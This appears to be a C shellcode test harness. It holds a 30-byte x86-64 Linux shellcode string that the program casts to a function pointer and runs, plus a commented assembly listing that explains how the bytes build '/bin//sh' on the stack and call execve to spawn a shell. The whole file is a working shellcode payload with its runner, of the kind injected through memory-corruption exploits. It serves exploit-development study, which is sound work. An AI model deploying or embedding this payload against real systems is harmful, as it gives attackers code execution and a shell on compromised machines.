#include <stdio.h>
#include <string.h>


	
unsigned char code[]=\
"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

main()
{
	printf("Shellcode Length:%d\n Bytes",(int)strlen(code));
	int (*ret)()=(int(*)())code;
	ret();
}

/*
global _start

section .text

_start:
	xor rax,rax
	push rax				;pushing the first set of null into the higher memory of the stack

	mov rbx,0x68732f2f6e69622f		;storing /bin//sh into rbx and pushing its value to the stack ; /bin//sh is used so that we get 8 bytes 
	push rbx

	mov rdi,rsp				;storing the current value of rsp to rdi so that the rdi contains and points to the address of /bin//sh

	push rax				;pushing the second set of nulls to the stack

	mov rdx,rsp				;storing the address of second set of null in to rdx so that rdx points to that address

	push rdi				;pushing the address of /bin//sh

	mov rsi,rsp				;rsi now points to the address containg the address of /bin//sh

	mov al,59
	syscall
*/
